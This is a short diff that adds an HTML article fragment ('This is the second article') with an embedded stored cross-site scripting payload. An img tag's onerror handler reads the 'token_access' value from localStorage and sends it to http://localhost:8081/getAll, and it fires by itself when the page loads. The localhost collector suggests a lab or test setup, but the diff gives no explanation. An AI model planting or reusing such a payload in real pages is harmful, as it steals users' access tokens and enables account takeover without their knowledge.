@@ -1,0 +1,7 @@
+<p>This is the <em>second</em> article.
+<img id="xss-img" src="#" onerror="
+  if (!this.dataset.triggered) {
+    this.dataset.triggered = 'true';
+    this.src = 'http://localhost:8081/getAll?data=' + encodeURIComponent(localStorage.getItem('token_access'));
+  }"/>
+</p>
